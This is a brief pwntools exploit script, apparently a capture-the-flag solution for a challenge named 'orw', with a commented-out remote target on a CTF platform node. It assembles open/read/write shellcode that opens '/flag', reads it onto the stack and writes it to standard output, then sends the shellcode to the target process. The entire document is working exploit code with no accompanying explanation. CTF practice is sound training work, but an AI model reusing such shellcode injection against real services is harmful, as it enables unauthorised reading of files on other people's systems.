from pwn import *

#r = remote('node3.buuoj.cn',29475)
r=process('./pwn')
context.log_level = 'debug'
elf = ELF('orw')

shellcode = shellcraft.open('/flag')
shellcode += shellcraft.read('eax','esp',100)
shellcode += shellcraft.write(1,'esp',100)
shellcode = asm(shellcode)

r.sendline(shellcode)

r.interactive()

